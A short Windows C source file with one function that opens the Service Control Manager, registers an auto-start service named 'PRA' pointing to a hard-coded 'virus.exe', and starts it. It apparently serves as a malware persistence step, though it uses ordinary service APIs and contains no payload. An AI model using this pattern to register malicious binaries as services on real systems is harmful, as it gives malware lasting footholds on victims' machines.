#ifndef UNICODE
#define UNICODE
#endif 

#include <stdio.h>
#include <windows.h>

#define SC_NAME L"PRA"

const WCHAR PATH_TO_BIN[] = L"\"C:\\Systems\\virus.exe\"";
const int PATH_SIZE = sizeof(PATH_TO_BIN);

void create_and_start_service()
{
    SC_HANDLE sc_manager_handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

    if (sc_manager_handle == NULL)
    {
        printf("Cannot open SCManager\nError: %d", GetLastError());
        return;
    }

    SC_HANDLE sc_handle = CreateService
    (
        sc_manager_handle,
        SC_NAME,
        SC_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        PATH_TO_BIN,
        NULL,
        NULL,
        NULL,
        NULL,
        NULL
    );

    if ((sc_handle == NULL))
    {
        printf("sc_handle NULL\nError: %d", GetLastError());
        CloseServiceHandle(sc_manager_handle);
        return;
    }

    if (StartService(sc_handle, 0, NULL) == 0)
    {
        printf("Can`t start service\nError: %d", GetLastError());
        CloseServiceHandle(sc_handle);
        CloseServiceHandle(sc_manager_handle);
        return;
    }

    CloseServiceHandle(sc_handle);
    CloseServiceHandle(sc_manager_handle);
    return;
}
